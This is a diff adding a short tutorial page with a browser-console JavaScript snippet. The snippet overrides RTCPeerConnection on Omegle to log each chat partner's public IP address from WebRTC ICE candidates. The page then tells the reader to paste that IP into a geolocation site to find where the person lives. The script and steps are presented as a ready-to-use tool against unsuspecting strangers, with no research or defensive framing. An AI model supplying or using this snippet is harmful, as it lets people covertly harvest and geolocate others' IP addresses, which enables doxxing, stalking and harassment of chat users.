@@ -7,4 +7,33 @@
 <ol>
   <li>
     <p>First go to https://omegle.com</p>
-    
+    <p>Then inspect the site (ctrl + shift + i)</p>
+    <p>Then press "Console"</p>
+    <p>Then paste this script:</p>
+    <p>window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection
+
+window.RTCPeerConnection = function(...args) {
+ const pc = new window.oRTCPeerConnection(...args)
+
+pc.oaddIceCandidate = pc.addIceCandidate
+
+pc.addIceCandidate = function(iceCandidate, ...rest) {
+ const fields = iceCandidate.candidate.split(' ')
+
+if (fields[7] === 'srflx') {
+console.log('IP Address:', fields[4])
+}
+return pc.oaddIceCandidate(iceCandidate, ...rest)
+
+}
+
+return pc
+}
+</p>
+    <p>If you did that press "Enter"</p>
+    <p>Then <b>DON'T</b> close the inspect element. Just go into a chat and you see the IP</p>
+    <p>If you want to know where the person live go to this site: https://dnschecker.org/ip-location.php?ip and paste his ip there!</p>
+# Special Thanks:
+    <a href="https://github.com/getgaming">GitHub</a>
+    <a href="https://youtube.com/getgamingyt">Youtube</a>
+    <a href="https://getgaming.ml">Website</a>
